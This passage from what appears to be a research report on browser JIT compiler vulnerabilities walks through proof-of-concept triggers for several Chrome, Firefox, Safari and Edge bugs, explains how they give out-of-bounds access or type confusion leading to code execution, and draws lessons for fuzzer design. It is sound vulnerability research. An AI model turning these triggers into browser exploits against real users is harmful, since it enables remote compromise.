and pasting a publicly available exploit into a PDF file to attack Foxit Reader users. 
Generalization for variation analysis: 
• 
Calls to parseInt() should be added by a fuzzer to prevent function inlining. 
• 
Problems can occur when different compilers are mixed with each other. For 
example, when one function is optimized by TurboFan and another by Crankshaft. 
• 
A fuzzer should add code which re-assigns a value to a global variable and code 
which assigns a property to the same variable at different locations. 
132 https://chromium.googlesource.com/v8/v8.git/+/d0a047d440ea6283f9e63056cf5ec1fa3203e309 
133 https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf 
134 http://eternalsakura13.com/2019/04/29/CVE-2016-5198/ 
135 https://www.foxitsoftware.com/company/about.php 
73 
Chromium issue 944062 (2019) – Missing map check in ReduceArrayOfIncludes when 
an unreliable map is inferred 
01: const array = [42, 2.1];   
// non-stable map (PACKED_DOUBLE) 
02: let cond = false; 
03: function change_assumption() { 
04:     if (cond) array[100000] = 4.2;  // change to dictionary mode 
05:     return 42; 
06: }; 
07: function opt() { 
08:     return array.includes(change_assumption()); 
09: } 
10: opt(); 
11: %OptimizeFunctionOnNextCall(opt); 
12: opt(); 
13: cond = true; 
14: opt(); // Trigger OOB 
When the opt function gets optimized the internal implementation of Array.includes calls 
InferReceiverMaps to obtain the map of the array to add a type specific implementation. In 
line 1 the elements-kind of the array variable is initially set to PACKED_DOUBLE. The 
compiler therefore adds code which implements the Array.includes function for 
PACKED_DOUBLE elements. However, the InferReceiverMaps function can return 
kUnreliableReceiverMaps which means that the caller must add a CheckMap node to ensure 
that the inferred map matches the runtime one. However, the code did not add a CheckMap 
node and just relied on the inferred unreliable map.  
In the PoC the function change_assumption is invoked as argument to Array.includes which 
changes elements-kind to a dictionary array. A dictionary is used because a high index is 
accessed in line 4 which would waste a lot of space if the elements would be stored 
continuously. The optimized Array.includes code then leads to OOB access because it 
assumes PACKED_DOUBLE values instead of a dictionary. 
The following code is a variation of the vulnerability: 
01: function opt(idx, arr) { 
02:     arr.__defineSetter__(idx, () => { }); // change elements-kind to dictionary 
03:     return arr.includes(1234);   
     // Leads to OOB 
04: } 
05: opt('', []); 
06: opt('', []); 
07: %OptimizeFunctionOnNextCall(opt); 
08: opt('1000000', []); 
Instead of a function invocation passed as argument, a getter is defined to change elements-
kind to a dictionary. 
A writeup of the vulnerability is available at 136. 
136 https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html 
74 
Generalization for variation analysis: 
• 
A fuzzer should add code at random locations which sets a high index of an array, 
such as 100,000, to a value to change elements-kind of the array to a dictionary. 
• 
A fuzzer should replace values, which are passed as function arguments, with 
function invocations. Then, the original value can be returned by the function and 
additional code can be executed within the function. For example, in the first PoC, 
the value 42 could original be passed as argument in line 8. During mutation this 
value could be wrapped within a function call and additional code like line 4 can be 
executed. 
• 
During source code analysis focus can be put on code locations where 
InferReceiverMaps() is called and where the kUnreliableReceiverMaps string is not 
found. This hints that the return value of the function is not correctly checked for 
unreliable maps. 
Firefox bug 1544386, CVE-2019-11707 (exploited in-the-wild in 2019 against Coinbase) 
– Incorrect Array.prototype.pop() return type prediction 
01: // Run with --no-threads for increased reliability 
02: const a = [{ a: 0 }, { a: 1 }, { a: 2 }, { a: 3 }, { a: 4 }]; 
03: function opt() { 
04:     if (a.length == 0) { 
05:         a[3] = { a: 5 }; // change array length to 4 by accessing index 3 
06:     } 
07:     // pop the last value. IonMonkey will, based on inferred types, conclude  
08:     // that the result will always be an object, 
09:     // which is untrue when p[0] gets fetched. 
10:     const tmp = a.pop(); 
11:     tmp.a;  // this crashes when the controlled double value gets dereferenced 
12:     for (let v15 = 0; v15 < 10000; v15++) { }    // Force JIT compilation 
13: } 
14: var p = {}; 
15: p.__proto__ = [{ a: 0 }, { a: 1 }, { a: 2 }]; 
16: p[0] = -1.8629373288622089e-06;     // 0xbebf414141414141 
17: a.__proto__ = p; 
18: for (let i = 0; i < 1000; i++) { 
19:     opt();      // Trigger optimization 
20: } 
The variable a is initialized as an array of objects in line 2. In lines 15 to 17 the prototype of 
a is changed to an object which has an array of objects as prototype and with an element at 
index zero being a double value. In line 19 the opt function is called in a loop. This result, 
after several function invocations, in all original elements from line 2 getting popped in line 
10. After popping the last element from line 2, the pop call would return undefined and the 
values from line 15 and 16 would not get popped. 
However, as soon as all elements are popped, line 5 gets executed which changes the array 
length to 4 without changing the inferred object element type because an object gets again 
assigned. When the function gets recompiled, the compiler assumes that a.pop() still returns 
objects because the element at index three was also set to an object in line 5. The compiler 
therefore incorrectly omits type checks for line 11 and just assumes that the pop call always 
returns an object which leads to a type confusion. 
75 
Because line 5 just set the value for index three, later pop() calls pop the values from line 
15, except the value from index zero. When the value at index zero gets popped, the value 
from line 16 is returned which is a double value. Because the compiler assumed a pointer to 
a heap object as return value, the double value is incorrectly dereferenced which leads to a 
crash. Since the value can fully be controlled, it can be used to fake objects in-memory which 
leads to arbitrary read and write and therefore to full code execution. The root cause of the 
vulnerability is that the compiler only checks the element types of the array and the element 
types of the array prototype, however, lines 16 and 17 create a prototype in the middle of 
the prototype chain with a different type which is not checked.  
The vulnerability was independently found by Groß from Google Project Zero with the fuzzilli 
fuzzer and by criminals, which used it against cryptocurrency exchange employees at 
Coinbase 137. A detailed writeup of the vulnerability is available at 138 and at 139. An exploit is 
available at 140. 
Generalization for variation analysis: 
• 
A fuzzer should add objects in the middle of a prototype chain with elements stored 
as double values or as objects. Moreover, these objects can also be used to trigger 
callbacks. The objects should be stored in the middle of the prototype chain to bypass 
checks which just check the first and last objects in the prototype chain. 
• 
A fuzzer should add if-conditions which are just executed once in multiple executions 
and with code which change assumptions. 
• 
A fuzzer should add pop() calls on arrays and access the popped value or properties  
afterwards. 
Firefox bug 1538006, CVE-2019-9813 (Pwn2Own 2019) – Incorrect handling of proto 
mutations 
01: function opt(o, changeProto) { 
02:     if (changeProto) { 
03:         o.p = 42; 
04:         o.__proto__ = {}; 
// Change prototype 
05:     } 
06:     o.p = 13.37; 
07:     return o; 
08: } 
09: for (let i = 0; i < 1000; i++) { 
10:     opt({}, false); 
// Trigger JIT compilation 
11: } 
12: for (let i = 0; i < 10000; i++) { 
13:     let o = opt({}, true); 
14:     eval('o.p');  
// Crash here 
15: } 
137 https://blog.coinbase.com/responding-to-firefox-0-days-in-the-wild-d9c85a57f15b 
138 https://blog.bi0s.in/2019/08/18/Pwn/Browser-Exploitation/cve-2019-11707-writeup/ 
139 https://vigneshsrao.github.io/writeup/ 
140 https://github.com/vigneshsrao/CVE-2019-11707 
76 
In line 10 the opt function is optimized for the case that the argument changeProto is false. 
The code is therefore optimized to store in line 6 the property p as a double value. Firefox 
stores for every variable an object group and a shape. The shape is basically just another 
synonym for the map or structure of an object and the object group is used to store the 
prototype and type information. When changeProto is changed to true in line 13, the function 
gets recompiled because the object group changes because line 4 assigns a new prototype. 
However, the shape is still the same because line 3 and 6 access the same property and 
therefore have the same property structure. Only the type changes because line 3 assigns 
a SMI and not a double value, but types are stored in the object group. That means that code 
must be generated for line 6 which first checks the object group. Such code is called a type 
barrier in Firefox. The vulnerability exists because this type barrier is not added in this case. 
Only code is generated which writes a double value to the first inline cache of object o to 
store property p. However, since the type changed, a boxed double value should be written 
but the code writes an unboxed double value. That means that a raw double value is written 
instead of a pointer to a heap object holding the double value. Since the written value can 
fully be controlled, arbitrary objects can be faked in memory which leads to full code 
execution. 
The vulnerability was exploited during Pwn2Own 2019. Exploitation details can be found in 
the Google Project Zero bug tracker 141 and at 142. 
Generalization for variation analysis: 
• 
A fuzzer should add Boolean variables as arguments to JIT compiled functions and 
flip the value after JIT compilation was performed to trigger additional operations. 
• 
A fuzzer should change the __proto__ property of variables at random locations. 
• 
A fuzzer should wrap code sometimes within an eval() call. 
141 https://bugs.chromium.org/p/project-zero/issues/detail?id=1810 
142 https://www.zerodayinitiative.com/blog/2019/4/18/the-story-of-two-winning-pwn2own-jit-vulnerabilities-in-
mozilla-firefox 
77 
4.5.2 Missing or incorrect bound checks 
Incorrect optimization bugs, which remove bound checks, can easily occur and can often not 
be obvious at first glance. An example is the CTF challenge Pwn-just-in-time created for 
Google CTF 2018 Finals. It added a duplicate addition reducer which combined two additions 
to a single addition when both operands were hardcoded numbers. For example, code like 
some_variable+1+1 was optimized to some_variable+2. This optimization seems correct, 
however, in JavaScript it is not. JavaScript stores numbers in the IEEE-754 double format 
which means the maximum value, which can be stored without precision lose, is 
9,007,199,254,740,991. Figure 5 shows the output of a JavaScript shell which demonstrates 
that the mentioned optimization is not correct because of precision lose with larger values: 
Figure 5: Precision lose in JavaScript 
This incorrect optimization can be exploited because a runtime value can be created, which 
is different to the assumed value by the compiler. This means code can be created which 
incorrectly removes array bound checks which therefore leads to OOB access. Exploitation 
details and an exploit for the challenge can be found at 143. 
In February 2019 hardening against bound check elimination vulnerabilities was 
implemented in v8 144. If the compiler can guarantee that a bound check is not required, the 
check is no longer eliminated and instead kept. If the check fails, the code aborts. This is 
also observed by various researchers: “What a bummer! There is no elimination of bounds 
checking anymore. [..] v8 has now implemented certain hardening that will either deoptimize 
the code or straight abort when trying to access out-of-bounds on the array. Yikes! What an 
ending! [...] Finally, we can see that browser development goes too fast, like very fast, and 
because of this, browser exploitation goes obsolete in just a few months, making it a real cat 
and the mouse race to actually get exploits going [..].” 145 
Techniques to circumvent the hardening in certain situations were published three months 
later by Fetiveau 146 and by Zhao 147. 
143 https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/ 
144 https://bugs.chromium.org/p/v8/issues/detail?id=8806  
145 https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/ 
146 https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/ 
147 https://gts3.org/2019/turbofan-BCE-exploit.html 
78 
Examples: 
Safari CVE-2017-2547 (Pwn2Own 2017) – Missing array bound check 
01: let arr = new Uint32Array(10); 
02: for (let i = 0; i < 0x100000; i++) { 
03:     parseInt();       // Force JIT compilation 
04: } 
05: arr[8] = 1; 
      //Protected via a bound check 
06: arr[-0x12345678] = 2;  //OOB access because bound check is not performed a 2nd time 
When an array is accessed at a specific index, the compiler adds code which checks the 
array bounds to ensure that no OOB access is possible. However, if the array is accessed 
in subsequent code and no side effects can happen between the code, the later bound 
checks may be unnecessary. For example, if first index 20 is accessed and afterwards index 
10 and 5 are accessed, the bound checks for index 10 and 5 can be removed because the 
first bound check already ensured that the array has at least a size of 21. The vulnerability 
occurs because only the upper bound is checked and the negative index from line 6 is always 
smaller than the array size of 10. The loop in line 2 to 4 is used to enforce JIT compilation. 
The vulnerability was exploited 148 by Tencent Team Sniper in Pwn2Own 2017 and found 
independently one week later by lokihardt 149. 
Generalization for variation analysis: 
• 
A fuzzer should add multiple array element access operations in JIT compiled code 
and fuzz code in between, which could result in side effects. 
• 
The loop from line 2 to 4 can be used to enforce JIT compilation in Safari. 
Edge CVE-2018-0769 – Incorrect bounds calculation 
01: function opt(arr) { 
02:     if (arr.length <= 15) { return; } // Ensure a length of at least 15 
03:     let j = 0; 
04:     for (let i = 0; i < 2; i++) { 
05:         arr[j] = 0x1234;       // OOB access happens in 2nd iteration 
06:         j += 0x100000; 
07:         j + 0x7ffffff0;  
// INT_MAX - 0x7ffffff0 = 15; result is not stored! 
08:     } 
09: } 
10: for (let i = 0; i < 0x10000; i++) {  // Force JIT compilation 
11:     opt(new Uint32Array(100)); 
12: } 
In the first loop iteration the compiler assumes that j must be a value between INT_MIN and 
INT_MAX at line 6. Since line 7 adds 0x7fffff0, two cases can occur. In the first case the 
result overflows the INT_MAX value and the compiler adds code to deoptimize in this case. 
In the other case the result does not overflow. This happens when the value of j is after line 
6 between INT_MIN and INT_MAX – 0x7ffffff0, that is between INT_MIN and 15. This case 
was generated because INT_MIN + 0x7ffffff0 does not overflow INT_MAX, otherwise the 
148 https://www.thezdi.com/blog/2017/8/24/deconstructing-a-winning-webkit-pwn2own-entry 
149 https://bugs.chromium.org/p/project-zero/issues/detail?id=1220 
79 
data type of the result would be changed from int to float and no deoptimization code would 
be added. 
Since the code gets deoptimized in the first case, the compiler can assume that j is between 
INT_MIN and 15 at the start of the second iteration. Note that in line 7 the value is not added 
to j, the result gets discarded. The add operation is just required to let the compiler assume 
the mentioned value range. Since j is in the first iteration 0 and the compiler assumes that 
the maximum value of j is in the second iteration 15, the bound check can be removed 
because the code from line 2 already ensured that the array has at least a length of 16. 